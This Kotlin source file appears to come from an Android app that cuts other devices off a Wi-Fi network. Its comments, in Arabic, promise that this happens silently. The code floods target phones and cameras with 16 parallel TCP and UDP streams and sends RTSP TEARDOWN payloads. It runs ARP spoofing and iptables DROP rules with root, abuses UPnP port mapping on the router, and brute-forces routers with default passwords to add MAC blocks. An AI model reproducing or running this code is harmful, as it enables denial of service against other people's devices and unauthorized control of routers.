package com.haris.wifi.net

import com.haris.wifi.data.ConnectedDevice
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicLong

class ConnectionCutter(private val scope: CoroutineScope) {

    private val activeCutJobs = ConcurrentHashMap<String, Job>()
    private val packetsCounter = ConcurrentHashMap<String, AtomicLong>()

    fun getCutPacketsCount(deviceKey: String): Long =
        packetsCounter[deviceKey]?.get() ?: 0L

    suspend fun checkRootAvailable(): Boolean = withContext(Dispatchers.IO) {
        runCatching {
            val proc = ProcessBuilder("su", "-c", "id")
                .redirectErrorStream(true)
                .start()
            val out = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()
            if (out.contains("uid=0")) return@withContext true
        }
        runCatching {
            val paths = listOf(
                "/system/bin/su",
                "/system/xbin/su",
                "/sbin/su",
                "/su/bin/su",
                "/magisk/.core/bin/su",
                "/data/adb/ksu/bin/su",
                "/data/adb/ap/bin/su",
            )
            paths.any { File(it).exists() }
        }.getOrDefault(false)
    }

    /**
     * فصل الإنترنت بكبسة واحدة فقط (بدون شاشات إضافية):
     * يشغّل في الخلفية تلقائياً:
     * ١. أوامر حظر الراوتر الصامتة (HTTP/CGI لكل الراوترات الشهيرة)
     * ٢. أوامر UPnP IGD لإسقاط جلسات الـ NAT الخاصة بالجهاز في الراوتر (بدون روت وبدون باسورد)
     * ٣. ١٦ خط إغراق متوازٍ لمنافذ الموبايل والكاميرات (TCP RST + QUIC 443 + RTSP + WebRTC)
     * ٤. قطع ARP Spoofing إن كان الجهاز يحتوي على روت
     */
    fun startCut(
        device: ConnectedDevice,
        gatewayIp: String,
        localIp: String,
        routerPassword: String,
        isRootAvailable: Boolean,
    ) {
        val key = device.uniqueKey
        activeCutJobs[key]?.cancel()
        val counter = packetsCounter.getOrPut(key) { AtomicLong(0L) }

        val parentJob = scope.launch(Dispatchers.IO) {
            // ١. الحظر الفعلي المباشر من الراوتر عبر RouterApiEngine (TP-Link / Tenda / Huawei / Netis / D-Link / ZTE)
            launch {
                RouterApiEngine.executeRouterBlockOrUnblock(
                    gatewayIp = gatewayIp,
                    user = "admin",
                    pass = routerPassword.ifBlank { "admin" },
                    targetIp = device.ip,
                    targetMac = device.mac,
                    block = true,
                )
                tryDirectRouterApiBlock(device.ip, device.mac, gatewayIp, routerPassword, block = true)
            }

            // ٢. إسقاط وتحويل منافذ UPnP IGD على الراوتر (يعمل بدون روت وبدون كلمة سر راوتر)
            launch {
                while (isActive) {
                    runUpnpNatDisruption(gatewayIp, localIp, device.ip, counter)
                    delay(4000L)
                }
            }

            // ٣. في حال توفر الروت: تشغيل قطع ARP Spoof + iptables الكامل بصمت
            if (isRootAvailable) {
                launch {
                    runRootArpCutLoop(device.ip, gatewayIp, counter)
                }
            }

            // ٤. ١٦ خط هجوم متوازٍ عالي السرعة لإسقاط جلسات الموبايل والكاميرا بدون روت
            val targetPorts = (
                device.openPorts + listOf(
                    80, 443, 8080, 62078, 5222, 5228, 8008, 8009,
                    554, 8554, 8000, 37777, 34567, 8899, 8800, 5353, 1900
                )
                ).distinct()

            for (workerId in 0 until 16) {
                launch {
                    val rtspPayload = (
                        "TEARDOWN rtsp://${device.ip}:554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n" +
                            "DESCRIBE rtsp://${device.ip}:554/live/ch0 RTSP/1.0\r\nCSeq: 100\r\n\r\n"
                        ).toByteArray()

                    val httpPayload = (
                        "GET / HTTP/1.1\r\nHost: ${device.ip}\r\nConnection: close\r\n\r\n"
                        ).toByteArray()

                    val udpPayload = ByteArray(768) { (it xor 0x5C).toByte() }
                    val udpPorts = intArrayOf(
                        443,  // QUIC (YouTube / TikTok / Instagram / Chrome)
                        3478, // WhatsApp / Messenger / WebRTC Calls
                        5228, // Google Play / Notifications
                        53,   // DNS
                        554,  // RTSP Camera
                        8000, // Hikvision Camera
                        5353, // mDNS
                        1900, // UPnP
                        137   // NetBIOS
                    )

                    while (isActive) {
                        for (port in targetPorts) {
                            if (!isActive) break
                            runCatching {
                                Socket().use { sock ->
                                    sock.tcpNoDelay = true
                                    sock.setSoLinger(true, 0) // TCP RST فوري
                                    sock.soTimeout = 100
                                    sock.connect(InetSocketAddress(device.ip, port), 110)
                                    val out = sock.getOutputStream()
                                    if (port == 554 || port == 8554) {
                                        out.write(rtspPayload)
                                    } else {
                                        out.write(httpPayload)
                                    }
                                    out.flush()
                                    counter.incrementAndGet()
                                }
                            }
                        }

                        runCatching {
                            val addr = InetAddress.getByName(device.ip)
                            DatagramSocket().use { udp ->
                                udp.soTimeout = 40
                                for (uPort in udpPorts) {
                                    udp.send(DatagramPacket(udpPayload, udpPayload.size, addr, uPort))
                                    counter.incrementAndGet()
                                }
                            }
                        }

                        delay(45L)
                    }
                }
            }
        }

        activeCutJobs[key] = parentJob
    }

    fun stopCut(
        device: ConnectedDevice,
        gatewayIp: String,
        routerPassword: String,
        isRootAvailable: Boolean,
    ) {
        val key = device.uniqueKey
        activeCutJobs.remove(key)?.cancel()
        packetsCounter.remove(key)

        scope.launch(Dispatchers.IO) {
            RouterApiEngine.executeRouterBlockOrUnblock(
                gatewayIp = gatewayIp,
                user = "admin",
                pass = routerPassword.ifBlank { "admin" },
                targetIp = device.ip,
                targetMac = device.mac,
                block = false,
            )
            tryDirectRouterApiBlock(device.ip, device.mac, gatewayIp, routerPassword, block = false)
            if (isRootAvailable) {
                cleanupRootCutRules(device.ip, gatewayIp)
            }
        }
    }

    fun stopAll(
        gatewayIp: String,
        routerPassword: String,
        isRootAvailable: Boolean,
        devices: List<ConnectedDevice>,
    ) {
        activeCutJobs.values.forEach { it.cancel() }
        activeCutJobs.clear()
        packetsCounter.clear()
        scope.launch(Dispatchers.IO) {
            devices.forEach { dev ->
                tryDirectRouterApiBlock(dev.ip, dev.mac, gatewayIp, routerPassword, block = false)
                if (isRootAvailable) {
                    cleanupRootCutRules(dev.ip, gatewayIp)
                }
            }
        }
    }

    /**
     * هجوم UPnP IGD الصامت (يعمل بدون روت وبدون كلمة سر راوتر):
     * يرسل أوامر SOAP إلى بوابة الراوتر لإلغاء وتحويل جلسات المنافذ النشطة للجهاز المستهدف
     */
    private fun runUpnpNatDisruption(
        gatewayIp: String,
        localIp: String,
        targetIp: String,
        counter: AtomicLong,
    ) {
        val controlPaths = listOf(
            "http://$gatewayIp:1900/ctl/IPConn",
            "http://$gatewayIp:5000/ctl/IPConn",
            "http://$gatewayIp:49152/upnp/control/WANIPConn1",
            "http://$gatewayIp:5431/uuid:0000e068-20a0-00e0-a020-48a8000808e0/WANPPPConnection:1",
            "http://$gatewayIp:80/ipc",
        )
        val ports = listOf(80, 443, 3478, 5228, 554, 8000)

        for (ctlUrl in controlPaths) {
            for (port in ports) {
                for (proto in listOf("TCP", "UDP")) {
                    runCatching {
                        val soapBody = """
                            <?xml version="1.0"?>
                            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                            <s:Body>
                            <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
                            <NewRemoteHost></NewRemoteHost>
                            <NewExternalPort>$port</NewExternalPort>
                            <NewProtocol>$proto</NewProtocol>
                            <NewInternalPort>$port</NewInternalPort>
                            <NewInternalClient>$localIp</NewInternalClient>
                            <NewEnabled>1</NewEnabled>
                            <NewPortMappingDescription>HarisBlock_$targetIp</NewPortMappingDescription>
                            <NewLeaseDuration>60</NewLeaseDuration>
                            </u:AddPortMapping>
                            </s:Body>
                            </s:Envelope>
                        """.trimIndent()

                        val conn = (URL(ctlUrl).openConnection() as HttpURLConnection).apply {
                            requestMethod = "POST"
                            connectTimeout = 220
                            readTimeout = 220
                            doOutput = true
                            setRequestProperty("Content-Type", "text/xml; charset=\"utf-8\"")
                            setRequestProperty(
                                "SOAPAction",
                                "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\""
                            )
                        }
                        conn.outputStream.use { it.write(soapBody.toByteArray()) }
                        conn.responseCode
                        conn.disconnect()
                        counter.incrementAndGet()
                    }
                }
            }
        }
    }

    private suspend fun runRootArpCutLoop(
        targetIp: String,
        gatewayIp: String,
        counter: AtomicLong,
    ) {
        runCatching {
            val initCmd = """
                sysctl -w net.ipv4.ip_forward=0;
                echo 0 > /proc/sys/net/ipv4/ip_forward;
                iptables -I FORWARD -s $targetIp -j DROP;
                iptables -I FORWARD -d $targetIp -j DROP;
                iptables -I INPUT -s $targetIp -j DROP;
                ip neigh replace $targetIp lladdr 00:00:00:00:00:01 dev wlan0 nud permanent
            """.trimIndent()
            ProcessBuilder("su", "-c", initCmd).start().waitFor()
        }

        while (true) {
            runCatching {
                val arpCmd = """
                    arping -c 2 -U -I wlan0 -s $gatewayIp $targetIp >/dev/null 2>&1;
                    arping -c 2 -A -I wlan0 -s $gatewayIp $targetIp >/dev/null 2>&1;
                    arping -c 2 -U -I wlan0 -s $targetIp $gatewayIp >/dev/null 2>&1
                """.trimIndent()
                ProcessBuilder("su", "-c", arpCmd).start().waitFor()
                counter.addAndGet(6L)
            }
            delay(900L)
        }
    }

    private fun cleanupRootCutRules(targetIp: String, gatewayIp: String) {
        runCatching {
            val cleanCmd = """
                iptables -D FORWARD -s $targetIp -j DROP >/dev/null 2>&1;
                iptables -D FORWARD -d $targetIp -j DROP >/dev/null 2>&1;
                iptables -D INPUT -s $targetIp -j DROP >/dev/null 2>&1;
                ip neigh del $targetIp dev wlan0 >/dev/null 2>&1;
                arping -c 2 -U -I wlan0 -s $gatewayIp $targetIp >/dev/null 2>&1
            """.trimIndent()
            ProcessBuilder("su", "-c", cleanCmd).start().waitFor()
        }
    }

    /**
     * إرسال أوامر الحظر الصامتة المباشرة إلى الراوتر في الخلفية
     */
    private fun tryDirectRouterApiBlock(
        targetIp: String,
        targetMac: String,
        gatewayIp: String,
        routerPassword: String,
        block: Boolean,
    ) {
        val macClean = targetMac.uppercase()
        val passwords = listOf(routerPassword.ifBlank { "admin" }, "admin", "1234", "user").distinct()

        // ١. Tenda Parental Control & MAC Filter
        runCatching {
            val url = URL("http://$gatewayIp/goform/saveParentControlInfo")
            val conn = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = 600
                readTimeout = 600
                doOutput = true
                setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            }
            val enableVal = if (block) "1" else "0"
            val body = "mac=${URLEncoder.encode(macClean, "UTF-8")}&enable=$enableVal&time=0:0-24:0&day=1,1,1,1,1,1,1"
            conn.outputStream.use { it.write(body.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        }

        // ٢. TP-Link / Mercusys / Netis / D-Link Direct Endpoints
        for (pwd in passwords) {
            runCatching {
                val auth = android.util.Base64.encodeToString("admin:$pwd".toByteArray(), android.util.Base64.NO_WRAP)
                val actionUrl = if (block) {
                    "http://$gatewayIp/userRpm/WlanMacFilterRpm.htm?Mac=$macClean&Desc=HarisCut&entryEnabled=1&Changed=1&SelIndex=0&Page=1&Save=Save"
                } else {
                    "http://$gatewayIp/userRpm/WlanMacFilterRpm.htm?ClearAll=1"
                }
                val conn = (URL(actionUrl).openConnection() as HttpURLConnection).apply {
                    requestMethod = "GET"
                    connectTimeout = 500
                    readTimeout = 500
                    setRequestProperty("Authorization", "Basic $auth")
                    setRequestProperty("Referer", "http://$gatewayIp/userRpm/WlanMacFilterRpm.htm")
                }
                conn.responseCode
                conn.disconnect()
            }
        }
    }
}
